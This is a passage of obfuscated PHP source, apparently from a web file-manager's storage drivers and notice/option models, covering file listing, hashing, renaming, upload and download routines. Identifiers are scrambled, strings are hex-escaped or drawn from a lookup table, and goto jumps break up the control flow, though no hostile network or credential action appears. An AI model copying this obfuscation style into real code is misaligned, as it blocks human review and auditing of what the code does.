(!$this->delFolder($Ä§©ĞĞ)) { return !1; } } } } closedir($Æ¯Á¾Ş”); return rmdir($‰±şìÜÊ); } public function rename($ï¬ø´†, $ô‚Ğ¸«·) { $üÃŸ©µƒ =& $_SERVER[€ä¾™²]; $¯µˆ´‘Õ = $this->fileNameAuto($this->pathFather($ï¬ø´†), $ô‚Ğ¸«·); $¯µˆ´‘Õ = $this->iconvSystem($¯µˆ´‘Õ); $ï¬ø´† = $this->iconvSystem($ï¬ø´†); $¶ÄòŒ­Ñ = $this->pathFather($ï¬ø´†); $‰¯Çã×÷ = rtrim($¶ÄòŒ­Ñ, $üÃŸ©µƒ[8]) . $üÃŸ©µƒ[8] . $¯µˆ´‘Õ; $ÁŸ£Öşğ = @rename($ï¬ø´†, $‰¯Çã×÷); $‰¯Çã×÷ = $this->iconvApp($‰¯Çã×÷); if ($ÁŸ£Öşğ) { return $this->getPathOuter($‰¯Çã×÷); } $this->writeLog(__FUNCTION__ . $üÃŸ©µƒ[1604], !0); return !1; } public function size($ÓÓØ®ËÃ) { $ÓÓØ®ËÃ = $this->iconvSystem($ÓÓØ®ËÃ); return filesize_64($ÓÓØ®ËÃ); } public function info($Õ§˜¨£) { $Õ§˜¨£ = $this->iconvSystem($Õ§˜¨£); if ($this->isFolder($Õ§˜¨£)) { return $this->folderInfo($Õ§˜¨£); } else { if ($this->isFile($Õ§˜¨£)) { return $this->fileInfo($Õ§˜¨£); } } return !1; } protected function infoChildren($¹òÖš‘ó, &$÷ÑòßÇ×, $¿ŸåÖá‹ = true) { $ÍŸöÁÈ =& $_SERVER[€ä¾™²]; check_abort_echo(); $¹òÖš‘ó = rtrim($¹òÖš‘ó, $ÍŸöÁÈ[8]) . $ÍŸöÁÈ[8]; if ($¿ŸåÖá‹) { $¹òÖš‘ó = $this->iconvSystem($¹òÖš‘ó); } if (!($ô”îéà = @opendir($¹òÖš‘ó))) { return; } while (($ò•­‹˜º = readdir($ô”îéà)) !== !1) { if ($ò•­‹˜º == $ÍŸöÁÈ[10] || $ò•­‹˜º == $ÍŸöÁÈ[1414]) { continue; } $¸éØóß = $¹òÖš‘ó . $ò•­‹˜º; if (is_file($¸éØóß) || is_link($¸éØóß)) { $÷ÑòßÇ×[$ÍŸöÁÈ[80]]++; $÷ÑòßÇ×[$ÍŸöÁÈ[79]] += filesize_64($¸éØóß); } else { if (is_dir($¸éØóß)) { $÷ÑòßÇ×[$ÍŸöÁÈ[81]]++; $this->infoChildren($¸éØóß, $÷ÑòßÇ×, !1); } } } closedir($ô”îéà); } private function folderInfo($—à‘À©Û, $Êßª¯¢ = false) { $½ÇØĞ¢ =& $_SERVER[€ä¾™²]; $—à‘À©Û = rtrim($—à‘À©Û, $½ÇØĞ¢[8]) . $½ÇØĞ¢[8]; $ü˜“â = $this->iconvApp($this->pathThis($—à‘À©Û)); if ($Êßª¯¢) { return array($½ÇØĞ¢[32] => $ü˜“â, $½ÇØĞ¢[87] => $this->getPathOuter($—à‘À©Û), $½ÇØĞ¢[33] => $½ÇØĞ¢[78]); } $«Ğ«£Äª = array($½ÇØĞ¢[32] => $ü˜“â, $½ÇØĞ¢[87] => $this->getPathOuter($—à‘À©Û), $½ÇØĞ¢[33] => $½ÇØĞ¢[78], $½ÇØĞ¢[232] => @filectime($—à‘À©Û), $½ÇØĞ¢[88] => @filemtime($—à‘À©Û), $½ÇØĞ¢[1608] => @fileatime($—à‘À©Û), $½ÇØĞ¢[1609] => is_readable($—à‘À©Û), $½ÇØĞ¢[1610] => is_writable($—à‘À©Û), $½ÇØĞ¢[1611] => get_mode($—à‘À©Û)); return $«Ğ«£Äª; } private function fileInfo($¾½”è‹Î, $ˆË³èÊ = false) { $«ÌÜ¸¤¦ =& $_SERVER[€ä¾™²]; $Şè„Êâï = $this->iconvApp($this->pathThis($¾½”è‹Î)); if ($ˆË³èÊ) { return array($«ÌÜ¸¤¦[32] => $Şè„Êâï, $«ÌÜ¸¤¦[87] => $this->getPathOuter($¾½”è‹Î), $«ÌÜ¸¤¦[33] => $«ÌÜ¸¤¦[231], $«ÌÜ¸¤¦[79] => $this->size($¾½”è‹Î), $«ÌÜ¸¤¦[167] => $this->ext($Şè„Êâï)); } $öÇÚ§í = array($«ÌÜ¸¤¦[32] => $Şè„Êâï, $«ÌÜ¸¤¦[87] => $this->getPathOuter($¾½”è‹Î), $«ÌÜ¸¤¦[33] => $«ÌÜ¸¤¦[231], $«ÌÜ¸¤¦[232] => @filectime($¾½”è‹Î), $«ÌÜ¸¤¦[88] => @filemtime($¾½”è‹Î), $«ÌÜ¸¤¦[1608] => @fileatime($¾½”è‹Î), $«ÌÜ¸¤¦[79] => $this->size($¾½”è‹Î), $«ÌÜ¸¤¦[167] => $this->ext($Şè„Êâï), $«ÌÜ¸¤¦[1609] => is_readable($¾½”è‹Î), $«ÌÜ¸¤¦[1610] => is_writable($¾½”è‹Î), $«ÌÜ¸¤¦[1611] => get_mode($¾½”è‹Î)); return $öÇÚ§í; } public function exist($ş˜çØËˆ) { $ş˜çØËˆ = $this->iconvSystem($ş˜çØËˆ); return @file_exists($ş˜çØËˆ); } public function isFile($ÀÈøâï) { $ÀÈøâï = $this->iconvSystem($ÀÈøâï); return @is_file($ÀÈøâï); } public function isFolder($½´œ´ˆ¤) { $½´œ´ˆ¤ = $this->iconvSystem($½´œ´ˆ¤); return @is_dir($½´œ´ˆ¤); } public function listPath($¨»‹ÆÍ, $ìŞ£ÀÁ = false) { $±¬ó•îÊ =& $_SERVER[€ä¾™²]; $¨»‹ÆÍ = $this->iconvSystem($¨»‹ÆÍ); $¨»‹ÆÍ = rtrim($¨»‹ÆÍ, $±¬ó•îÊ[8]) . $±¬ó•îÊ[8]; $™èÚíƒµ = array($±¬ó•îÊ[85] => array(), $±¬ó•îÊ[86] => array()); if (!($áş°ÛÜ = @opendir($¨»‹ÆÍ))) { return $™èÚíƒµ; } while (($•¶¼·ì¯ = readdir($áş°ÛÜ)) !== !1) { if ($•¶¼·ì¯ == $±¬ó•îÊ[10] || $•¶¼·ì¯ == $±¬ó•îÊ[1414]) { continue; } $ÕÃ…‘—ª = $¨»‹ÆÍ . $•¶¼·ì¯; if (is_file($ÕÃ…‘—ª)) { $™èÚíƒµ[$±¬ó•îÊ[86]][] = $this->fileInfo($ÕÃ…‘—ª, $ìŞ£ÀÁ); } else { $™èÚíƒµ[$±¬ó•îÊ[85]][] = $this->folderInfo($ÕÃ…‘—ª, $ìŞ£ÀÁ); } } closedir($áş°ÛÜ); return $™èÚíƒµ; } public function listAll($à´Ñ„Ûœ, &$‚×šÖÕ  = array()) { $ÜĞÊ÷‚ =& $_SERVER[€ä¾™²]; $à´Ñ„Ûœ = $this->iconvSystem($à´Ñ„Ûœ); $à´Ñ„Ûœ = rtrim($à´Ñ„Ûœ, $ÜĞÊ÷‚[8]) . $ÜĞÊ÷‚[8]; if (!($‹„Ó¿ = @opendir($à´Ñ„Ûœ))) { return $‚×šÖÕ ; } while (($‹ùÖµ“ò = readdir($‹„Ó¿)) !== !1) { if ($‹ùÖµ“ò == $ÜĞÊ÷‚[10] || $‹ùÖµ“ò == $ÜĞÊ÷‚[1414]) { continue; } $ÓÑ‘¿— = $à´Ñ„Ûœ . $‹ùÖµ“ò; $¤ŸÍè²Ë = is_dir($ÓÑ‘¿—) && !is_link($ÓÑ‘¿—) ? 1 : 0; $ÓÑ‘¿— = $¤ŸÍè²Ë ? $ÓÑ‘¿— . $ÜĞÊ÷‚[8] : $ÓÑ‘¿—; $‚×šÖÕ [] = array($ÜĞÊ÷‚[87] => $this->getPathOuter($ÓÑ‘¿—), $ÜĞÊ÷‚[78] => $¤ŸÍè²Ë, $ÜĞÊ÷‚[88] => intval(@filemtime($ÓÑ‘¿—)), $ÜĞÊ÷‚[79] => $¤ŸÍè²Ë ? 0 : intval($this->size($ÓÑ‘¿—))); if ($¤ŸÍè²Ë) { $this->listAll($ÓÑ‘¿—, $‚×šÖÕ ); } } closedir($‹„Ó¿); return $‚×šÖÕ ; } public function has($¤Õ–Ş˜Ó, $‘”‡è¤ = false, $Òï£€·¯ = true) { $û´Áè =& $_SERVER[€ä¾™²]; $¤Õ–Ş˜Ó = $this->iconvSystem($¤Õ–Ş˜Ó); $¤Õ–Ş˜Ó = rtrim($¤Õ–Ş˜Ó, $û´Áè[8]) . $û´Áè[8]; if (!($àßÀáĞõ = @opendir($¤Õ–Ş˜Ó))) { return !1; } $£œ¥¿Å = 0; $Åü’ÍßÚ = 0; $ìïß«­ = 0; while (($¦­…´ö„ = readdir($àßÀáĞõ)) !== !1) { if ($¦­…´ö„ == $û´Áè[10] || $¦­…´ö„ == $û´Áè[1414]) { continue; } $¼›ÀöÑ¢ = $¤Õ–Ş˜Ó . $¦­…´ö„; if ($‘”‡è¤) { $ìïß«­++; if (@is_file($¼›ÀöÑ¢)) { $£œ¥¿Å++; } else { $Åü’ÍßÚ++; } if ($ìïß«­ > 10000) { break; } continue; } if ($Òï£€·¯) { if (@is_file($¼›ÀöÑ¢)) { return !0; } } else { if (@is_dir($¼›ÀöÑ¢ . $û´Áè[8])) { return !0; } } } closedir($àßÀáĞõ); if ($‘”‡è¤) { return array($û´Áè[240] => $£œ¥¿Å, $û´Áè[241] => $Åü’ÍßÚ); } return !1; } public function hashSimple($¿ä´¥Øê) { $úÍÕ¬”© =& $_SERVER[€ä¾™²]; if (!$¿ä´¥Øê) { return md5($úÍÕ¬”©[12]); } $¿ä´¥Øê = $this->iconvSystem($¿ä´¥Øê); $œûÉ™æ» = $this->size($¿ä´¥Øê); $á‘–ß¡ = 200; $ìÇ¯¯»Ù = 50; if ($œûÉ™æ» <= $á‘–ß¡ * $ìÇ¯¯»Ù) { return $this->hashMd5($¿ä´¥Øê) . $œûÉ™æ»; } $’´ú—Û÷ = $úÍÕ¬”©[12]; $‚Ÿê¬í³ = intval($œûÉ™æ» / $ìÇ¯¯»Ù); $Ò×ôÙ–ô = fopen($¿ä´¥Øê, $úÍÕ¬”©[1612]); if (!$Ò×ôÙ–ô) { return $’´ú—Û÷; } for ($Óæ¸ûŠ‰ = 0; $Óæ¸ûŠ‰ < $ìÇ¯¯»Ù; $Óæ¸ûŠ‰++) { fseek_64($Ò×ôÙ–ô, $‚Ÿê¬í³ * $Óæ¸ûŠ‰); $’´ú—Û÷ .= fread($Ò×ôÙ–ô, $á‘–ß¡); } fseek_64($Ò×ôÙ–ô, $œûÉ™æ» - $á‘–ß¡); $’´ú—Û÷ .= fread($Ò×ôÙ–ô, $á‘–ß¡); fclose($Ò×ôÙ–ô); return md5($’´ú—Û÷) . $œûÉ™æ»; } public function getContent($İöÜÍ»‚) { $İöÜÍ»‚ = $this->iconvSystem($İöÜÍ»‚); return file_get_contents($İöÜÍ»‚); } public function setContent($Òá¿á©ğ, $”–€¤¼Ğ = '') { $Òá¿á©ğ = $this->iconvSystem($Òá¿á©ğ); $ıÆÎ‘‡‹ = @file_put_contents($Òá¿á©ğ, $”–€¤¼Ğ, LOCK_EX); if (!$ıÆÎ‘‡‹) { $this->writeLog(__FUNCTION__ . $_SERVER[€ä¾™²][1604], !0); } clearstatcache(); @chmod($Òá¿á©ğ, $this->pathAuth); return $ıÆÎ‘‡‹ === !1 ? !1 : !0; } public function fileSubstr($ô–¸ ¤„, $ãÚÖÀıË = 0, $òãØÛê« = false) { $¾ñªñ€Š =& $_SERVER[€ä¾™²]; $ô–¸ ¤„ = $this->iconvSystem($ô–¸ ¤„); if ($òãØÛê« === !1) { $òãØÛê« = $this->size($ô–¸ ¤„); } if ($òãØÛê« <= 0) { return $¾ñªñ€Š[12]; } $ÙäÕ‰´Ä = fopen($ô–¸ ¤„, $¾ñªñ€Š[1612]); if (!$ÙäÕ‰´Ä) { return !1; } fseek_64($ÙäÕ‰´Ä, $ãÚÖÀıË); $«‘›¬ò™ = fread($ÙäÕ‰´Ä, $òãØÛê«); fclose($ÙäÕ‰´Ä); if (!$«‘›¬ò™) { $this->writeLog(__FUNCTION__ . $¾ñªñ€Š[1604], !0); } return $«‘›¬ò™; } public function upload($¸øëÍèè, $°ğ«ˆı, $çÌäÅè = false, $õ¨°€ÀÃ = REPEAT_REPLACE) { if (!$°ğ«ˆı || !@file_exists($°ğ«ˆı)) { return !1; } if ($çÌäÅè) { return $this->moveFile($°ğ«ˆı, $¸øëÍèè); } return $this->copyFile($°ğ«ˆı, $¸øëÍèè); } public function setModifyTime($­ÛØùÊ¦, $ˆ“ŠæõÓ = '') { @touch($­ÛØùÊ¦, intval($ˆ“ŠæõÓ)); } public function download($¨çËô®Í, $Ê¬‹Ñˆû) { return $this->iconvSystem($¨çËô®Í); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($¼®š€³») { parent::__construct($¼®š€³»); $this->setSignVersion($_SERVER[€ä¾™²][248]); } public function fileOutImage($©…Áë«é, $ô½•îË¢ = 250) { $£á½‘çñ =& $_SERVER[€ä¾™²]; if ($this->size($©…Áë«é) > 1024 * 1024 * 25) { return $this->fileOutImageServer($©…Áë«é, $ô½•îË¢); } $ş¨°ÜÈĞ = array($£á½‘çñ[1613] => $£á½‘çñ[1614] . $ô½•îË¢ . $£á½‘çñ[1615]); $¬´İâœõ = $this->link($©…Áë«é, $ş¨°ÜÈĞ); $this->fileOutLink($¬´İâœõ); } } goto b´øƒ¸­ƒ; f±òªß»İ¸: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\x2e\x6e\157\164\151\143\x65\x4c\x69\x73\164"; public $field = array("\156\x61\155\145", "\x63\x6f\156\x74\145\x6e\164", "\141\x75\164\x68", "\x6d\157\144\x65", "\164\x69\155\145", "\164\171\x70\x65", "\x6c\x65\166\x65\x6c", "\145\x6e\141\142\154\x65", "\x73\157\162\164"); public function listData($ê¥àÈ•Ò = false, $±ª¨÷¤„ = "\x73\x6f\x72\164", $Ëß²¥ß¯ = false) { return parent::listData($ê¥àÈ•Ò, $±ª¨÷¤„, $Ëß²¥ß¯); } public function add($Ïñ¥ï±«) { $ÃÂ·âÀÛ =& $_SERVER[€ä¾™²]; $ÁÎ¿¯Èı = time(); if ($Ïñ¥ï±«[$ÃÂ·âÀÛ[16]] == $ÃÂ·âÀÛ[2607]) { $ÁÎ¿¯Èı = strtotime($Ïñ¥ï±«[$ÃÂ·âÀÛ[205]]); } $Ïñ¥ï±«[$ÃÂ·âÀÛ[205]] = $ÁÎ¿¯Èı; return parent::insert($Ïñ¥ï±«); } public function update($µ—Ü™², $Å»¸™ì) { $ïà´Ÿ¢Ä =& $_SERVER[€ä¾™²]; $ä¦•ËÏ³ = $this->listData($µ—Ü™²); if (!$ä¦•ËÏ³) { return !1; } $Œ¤›ş–Œ = time(); if ($Å»¸™ì[$ïà´Ÿ¢Ä[16]] == $ïà´Ÿ¢Ä[2607]) { $Œ¤›ş–Œ = strtotime($Å»¸™ì[$ïà´Ÿ¢Ä[205]]); } $Å»¸™ì[$ïà´Ÿ¢Ä[205]] = $Œ¤›ş–Œ; return parent::update($µ—Ü™², $Å»¸™ì); } public function remove($—â ¶ºò) { $Ï†ÈÂØˆ = $this->listData($—â ¶ºò); if (!$Ï†ÈÂØˆ || $Ï†ÈÂØˆ[$_SERVER[€ä¾™²][190]]) { return !1; } return parent::remove($—â ¶ºò); } public function sort($Ööï¥–Ú, $“À°şÚê) { return parent::update($Ööï¥–Ú, $“À°şÚê); } public function enable($ÓØÒËÒØ, $£¦ÆÈØç) { return parent::update($ÓØÒËÒØ, array($_SERVER[€ä¾™²][2608] => $£¦ÆÈØç)); } private function initUserOption() { $ø×™ûíŸ =& $_SERVER[€ä¾™²]; $this->optionType = $ø×™ûíŸ[2609]; $this->modelType = $ø×™ûíŸ[2610]; $this->field = array($ø×™ûíŸ[2611], $ø×™ûíŸ[32], $ø×™ûíŸ[205], $ø×™ûíŸ[33], $ø×™ûíŸ[2612], $ø×™ûíŸ[850], $ø×™ûíŸ[227]); } public function userNoticeGet($É…êÙÃû = false) { $this->initUserOption(); return parent::listData($É…êÙÃû, $_SERVER[€ä¾™²][486], !0); } public function userNoticeAdd($Á§¡õ§) { $©î•ÂÔà =& $_SERVER[€ä¾™²]; $this->initUserOption(); $à™èôó  = $this->findByKey($©î•ÂÔà[2611], $Á§¡õ§[$©î•ÂÔà[486]]); if ($à™èôó ) { return !0; } $¼ÉîÇ«— = array($©î•ÂÔà[2611] => $Á§¡õ§[$©î•ÂÔà[486]], $©î•ÂÔà[32] => $Á§¡õ§[$©î•ÂÔà[32]], $©î•ÂÔà[205] => $Á§¡õ§[$©î•ÂÔà[205]], $©î•ÂÔà[33] => isset($Á§¡õ§[$©î•ÂÔà[33]]) ? $Á§¡õ§[$©î•ÂÔà[33]] : 1, $©î•ÂÔà[2612] => isset($Á§¡õ§[$©î•ÂÔà[2612]]) ? $Á§¡õ§[$©î•ÂÔà[2612]] : 0, $©î•ÂÔà[850] => 0, $©î•ÂÔà[227] => 0); return parent::insert($¼ÉîÇ«—); } public function userNoticeEdit($’şĞŠÄ•, $§üï”±î) { $this->initUserOption(); return parent::update($’şĞŠÄ•, $§üï”±î); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\164\145\x6d\137\x6f\160\x74\151\157\x6e"; protected $jsonField = array("\155\145\156\x75", "\x72\157\154\145", "\162\x6f\x6c\x65\107\x72\x6f\165\x70", "\x72\145\x67\x69\163\164", "\x65\155\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($›õÙËƒ) { return "\x53\171\x73\x74\145\155\117\160\x74\151\157\x6e\x5f{$›õÙËƒ}"; } protected function optionDefault($ï°¬»Û = '') { $½É–âåì =& $_SERVER[€ä¾™²]; if ($ï°¬»Û == $½É–âåì[12]) { return $GLOBALS[$½É–âåì[6]][$½É–âåì[468]]; } } } class SystemRecordModel extends ModelBaseLight { } goto c°£„Õ„²Ø; AÉáŸë£‹ˆ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ì»á·£¦) { $this->pathParse = $Ì»á·£¦; $this->model = Model($_SERVER[€ä¾™²][1479]); } public function getPath($£¨—¦îŠ) { return trim($£¨—¦îŠ, $_SERVER[€ä¾™²][8]); } public function pathFather($õ­ÜÛˆÎ) { $ÏÁ¾ÕÑÒ = $this->parse($õ­ÜÛˆÎ); $ÏÁ¾ÕÑÒ = $this->infoSimple($õ­ÜÛˆÎ); return $ÏÁ¾ÕÑÒ ? $ÏÁ¾ÕÑÒ[$_SERVER[€ä¾™²][191]] : !1; } public function pathThis($Ñ¤£ç…ú) { $º»­Š’ñ = $this->infoSimple($Ñ¤£ç…ú); return $º»­Š’ñ ? $º»­Š’ñ[$_SERVER[€ä¾™²][32]] : !1; } public function getPathOuter($×«÷¼¸”) { if (!$×«÷¼¸”) { return $×«÷¼¸”; } $”¨ıŞ¼– = $this->parse($×«÷¼¸”); return KodIO::make($”¨ıŞ¼–[$_SERVER[€ä¾™²][486]]); } public function copyFolderFromIO($÷ŸÄÒŸ¹, $ÑûµÇ¹À, $Ş—÷¹©´, $¶ñöÕ† , $‡«–ş£´) { $ß…â–èµ = $this->model->copyFolderFromIO($÷ŸÄÒŸ¹, $ÑûµÇ¹À, $Ş—÷¹©´, $¶ñöÕ† , $‡«–ş£´); return KodIO::make($ß…â–èµ); } public function isParentOf($÷à¡È®§, $ˆŒ’¹ÒÍ) { return $this->model->isParentOf($÷à¡È®§, $ˆŒ’¹ÒÍ); } public function mkfile($«ª™²€, $ÇîËäƒ„ = '', $ÖóÙÇáş = REPEAT_RENAME) { $³ŸÒçÌĞ =& $_SERVER[€ä¾™²]; $«Ï°™¾ˆ = $this->parse($«ª™²€); $«ª™²€ = $«Ï°™¾ˆ[$³ŸÒçÌĞ[486]]; for ($Õ¢€’ïÀ = 0; $Õ¢€’ïÀ < count($«Ï°™¾ˆ[$³ŸÒçÌĞ[1480]]); $Õ¢€’ïÀ++) { $§ÔñÛª = $«Ï°™¾ˆ[$³ŸÒçÌĞ[1480]][$Õ¢€’ïÀ]; if ($Õ¢€’ïÀ == count($«Ï°™¾ˆ[$³ŸÒçÌĞ[1480]]) - 1) { $«ª™²€ = $this->model->mkfile($«ª™²€, $§ÔñÛª, $ÇîËäƒ„, $ÖóÙÇáş); break; } $«ª™²€ = $this->model->mkdir($«ª™²€, $§ÔñÛª, REPEAT_SKIP); } return $this->getPathOuter($«ª™²€); } public function mkdir($‹ô½¼À, $ÂÅº™ÇÔ = REPEAT_SKIP) { $ı™Ãçùş =& $_SERVER[€ä¾™²]; $õïóôš = $this->parse($‹ô½¼À); $‹ô½¼À = $õïóôš[$ı™Ãçùş[486]]; for ($ÄÃ¨şÄÂ = 0; $ÄÃ¨şÄÂ < count($õïóôš[$ı™Ãçùş[1480]]); $ÄÃ¨şÄÂ++) { $¥êë’Ò = $õïóôš[$ı™Ãçùş[1480]][$ÄÃ¨şÄÂ]; $‹ô½¼À = $this->model->mkdir($‹ô½¼À, $¥êë’Ò, $ÂÅº™ÇÔ); } return $this->getPathOuter($‹ô½¼À); } public function copyFile($ğ¬à‡ãş, $½ÒüşÚ, $øÊáÔµõ = REPEAT_REPLACE) { $àı§€ğ¢ =& $_SERVER[€ä¾™²]; $îÇôÙ = $this->parse($½ÒüşÚ); $±é­”¯ = $this->model->copy($ğ¬à‡ãş, $îÇôÙ[$àı§€ğ¢[486]], $øÊáÔµõ, $îÇôÙ[$àı§€ğ¢[87]]); return $±é­”¯ ? $this->getPathOuter($±é­”¯) : !1; } public function moveFile($‡ÇØìƒ©, $ï€··¬±, $¯µãËç° = REPEAT_REPLACE) { $ìÏ»£ =& $_SERVER[€ä¾™²]; $£Í–Ùƒã = $this->parse($ï€··¬±); $Ñ¶êÀ’ª = $this->model->move($‡ÇØìƒ©, $£Í–Ùƒã[$ìÏ»£[486]], $¯µãËç°, $£Í–Ùƒã[$ìÏ»£[87]]); return $Ñ¶êÀ’ª ? $this->getPathOuter($Ñ¶êÀ’ª) : !1; } public function copy($ïà·¸±Õ, $“ƒÙ‡Ş, $¬Ë’œ‡Û = REPEAT_REPLACE, $›Øºô© = false) { $‰İÇÙŸ = $this->parse($“ƒÙ‡Ş); $°ÌÍàÏÍ = $this->model->copy($ïà·¸±Õ, $‰İÇÙŸ[$_SERVER[€ä¾™²][486]], $¬Ë’œ‡Û, $›Øºô©); return $°ÌÍàÏÍ ? $this->getPathOuter($°ÌÍàÏÍ) : !1; } public function moveSameAllow() { } public function move($û’Æ†ëÙ, $·Â¬ÑáÉ, $ø­ßÆäÇ = REPEAT_REPLACE, $­ºê¿ôÛ = false) { $öü“Ëù = $this->parse($·Â¬ÑáÉ); $êÅ¥ßÁÅ = $this->model->move($û’Æ†ëÙ, $öü“Ëù[$_SERVER[€ä¾™²][486]], $ø­ßÆäÇ, $­ºê¿ôÛ); return $êÅ¥ßÁÅ ? $this->getPathOuter($êÅ¥ßÁÅ) : !1; } public function remove($ŠŠ×Õâ°, $ß¤§¨´ò = true) { return $this->model->remove($ŠŠ×Õâ°, $ß¤§¨´ò); } public function rename($„ò¤Éá¶, $©Çº½§€) { $Í ª®‹• = $this->model->rename($„ò¤Éá¶, $©Çº½§€); return $Í ª®‹• ? $this->getPathOuter($„ò¤Éá¶) : $Í ª®‹•; } public function size($èŒĞÆêõ) { $×¢œ•õü = $this->infoSimple($èŒĞÆêõ); return $×¢œ•õü ? $×¢œ•õü[$_SERVER[€ä¾™²][79]] : 0; } public function infoSimple($ƒíãœ¸¢) { return $this->model->sourceInfo($ƒíãœ¸¢); } public function info($¤µŞ€«ç) { return $this->infoParse($¤µŞ€«ç); } public function infoAuth($˜Ò¼œÖ) { return $this->infoParse($˜Ò¼œÖ, !1, !0); } public function infoWithChildren($À¡éëÈ ) { return $this->infoParse($À¡éëÈ , !0); } protected function infoParse($ Ö½„’, $°áÜ¬‡Ê = false, $Ï©üô¡ß = false) { if (!$°áÜ¬‡Ê) { return $this->model->pathInfo($ Ö½„’, $Ï©üô¡ß); } return $this->model->pathInfoMore($ Ö½„’); } public function infoFullSimple($äŒğ ò) { $æˆŞ¬ò =& $_SERVER[€ä¾™²]; $·…İÙÑ½ = explode($æˆŞ¬ò[8], $äŒğ ò); $± ¥ “Ë = implode($æˆŞ¬ò[8], array_splice($·…İÙÑ½, 1)); return $this->model->pathInfoByPath($·…İÙÑ½[0], $± ¥ “Ë); } public function infoFull($õ‹£Î´) { $õõ·û©á = $this->infoFullSimple($õ‹£Î´); return is_array($õõ·û©á) ? $this->model->pathInfo($õõ·û©á[$_SERVER[€ä¾™²][192]]) : !1; } public function hashSimple($”«¶ÄÌ) { $½â¾€ã =& $_SERVER[€ä¾™²]; $¨¨¤éáä = $this->infoWithChildren($”«¶ÄÌ); return $¨¨¤éáä[$½â¾€ã[168]][$½â¾€ã[701]]; } public function hashMd5($ÀìÆØ€³) { $¸×‡•Ë =& $_SERVER[€ä¾™²]; $ãÇÏ«½ç = $this->infoWithChildren($ÀìÆØ€³); return $ãÇÏ«½ç[$¸×‡•Ë[168]][$¸×‡•Ë[570]]; } public function exist($šò¬ŞÚ¤) { $Æ¢ç‘ï =& $_SERVER[€ä¾™²]; $§„¸÷ˆ¶ = $this->parse($šò¬ŞÚ¤); if (!$§„¸÷ˆ¶[$Æ¢ç‘ï[87]]) { return $this->isFile($šò¬ŞÚ¤) || $this->isFolder($šò¬ŞÚ¤); } $»ğ€ğÆ¶ = array($Æ¢ç‘ï[499] => $§„¸÷ˆ¶[$Æ¢ç‘ï[486]], $Æ¢ç‘ï[32] => $§„¸÷ˆ¶[$Æ¢ç‘ï[87]]); $ĞÀÙ•’ = $this->model->where($»ğ€ğÆ¶)->find(); return $ĞÀÙ•’ ? !0 : !1; } public function isFile($øØØı¿ç) { $Õ®ç¬‘Ø =& $_SERVER[€ä¾™²]; $ó™Ò…š€ = $this->infoSimple($øØØı¿ç); return $ó™Ò…š€ && $ó™Ò…š€[$Õ®ç¬‘Ø[507]] == $Õ®ç¬‘Ø[229] ? !0 : !1; } public function isFolder($º‡ÎÊ„) { $½°¢Ğ›ê =& $_SERVER[€ä¾™²]; $Àı¡·Áò = $this->infoSimple($º‡ÎÊ„); return $Àı¡·Áò && $Àı¡·Áò[$½°¢Ğ›ê[507]] == $½°¢Ğ›ê[91] ? !0 : !1; } public function listPath($·Ü‘¥ñ¨, $¯†Üì‡® = false) { $‚³³Ôá‘ =& $_SERVER[€ä¾™²]; if ($·Ü‘¥ñ¨ == $‚³³Ôá‘[12]) { return !1; } $¿£¥¢¯š = array($‚³³Ôá‘[499] => $·Ü‘¥ñ¨); if ($¯†Üì‡®) { return $this->model->listSource($¿£¥¢¯š, -1); } return $this->model->listSource($¿£¥¢¯š); } public function has($è°Ê×¾ê, $ÑˆÕÌÅ = false, $¤¦â’ï¿ = null) { $¿óü û¡ =& $_SERVER[€ä¾™²]; $Ïß²ÙúÁ = $this->infoWithChildren($è°Ê×¾ê); if ($ÑˆÕÌÅ) { return array($¿óü û¡[241] => $Ïß²ÙúÁ[$¿óü û¡[241]], $¿óü û¡[240] => $Ïß²ÙúÁ[$¿óü û¡[240]]); } return $¤¦â’ï¿ ? $Ïß²ÙúÁ[$¿óü û¡[241]] : $Ïß²ÙúÁ[$¿óü û¡[240]]; } public function listAll($™ä‡®«) { $ñ ¦à–½ = IO::info($this->pathParse[$_SERVER[€ä¾™²][87]]); if (!$ñ ¦à–½) { return array(); } return $this->model->listAll($™ä‡®«); } public function getContent($İ£ì’âÉ) { return $this->model->getContent($İ£ì’âÉ); } public function setContent($£Ş§üØï, $Š¸ıˆÎ£ = '') { return $this->model->setContent($£Ş§üØï, $Š¸ıˆÎ£); } public function fileSubstr($·¥æ˜ÒÒ, $²­±ï˜, $¶éÌÂÈ›) { return $this->model->fileSubstr($·¥æ˜ÒÒ, $²­±ï˜, $¶éÌÂÈ›); } public function download($£ı‰Áëô, $ÚÜ„ˆë× = '') { $¢ô¹Çƒ¹ = get_path_father($ÚÜ„ˆë×); $­Àó¾¥ó = get_path_this($ÚÜ„ˆë×); $Ô°²Ğ“ = $this->model->fileInfoGet($£ı‰Áëô); $”¬ß¦éÑ = IO::copy($Ô°²Ğ“[$_SERVER[€ä¾™²][87]], $¢ô¹Çƒ¹, !1, $­Àó¾¥ó); return $”¬ß¦éÑ; } public function setModifyTime($Ô„µ¡Ôä, $ûˆçæ›… = '') { $’éæñË =& $_SERVER[€ä¾™²]; if (!$Ô„µ¡Ôä) { return; } $this->model->where(array($’éæñË[513] => $Ô„µ¡Ôä))->save(array($’éæñË[88] => $ûˆçæ›…)); } public function upload($ÒšçÊÚ, $ˆÙó®úö, $óæ¸áÇ§ = false, $¸¦‚ÙÛ = REPEAT_REPLACE) { $‹ø¶¸Üâ =& $_SERVER[€ä¾™²]; $ç öí°ã = $this->parse($ÒšçÊÚ); $ÜÀ¯Õ„¶ = $this->model->addFile($ç öí°ã[$‹ø¶¸Üâ[486]], $ˆÙó®úö, $ç öí°ã[$‹ø¶¸Üâ[87]], $óæ¸áÇ§, $¸¦‚ÙÛ); return $this->getPathOuter($ÜÀ¯Õ„¶); } public function uploadFileByID($è’—º²¬, $ç›ËûªÇ, $êò–Î„) { $’ÎÈºÓ† =& $_SERVER[€ä¾™²]; $÷—„ì°– = $this->parse($è’—º²¬); $úõèÛºµ = $this->model->addFileByFileID($÷—„ì°–[$’ÎÈºÓ†[486]], $ç›ËûªÇ, $÷—„ì°–[$’ÎÈºÓ†[87]], $êò–Î„); return $this->getPathOuter($úõèÛºµ); } public function addFileByRemote($ ±’­ÚÕ, $ÈòÇñ¦, $³’ÁÚˆë = array(), $ãÀ‡ÇæÄ = '', $§¯Ûóá) { $Äƒ¬Ïîù =& $_SERVER[€ä¾™²]; 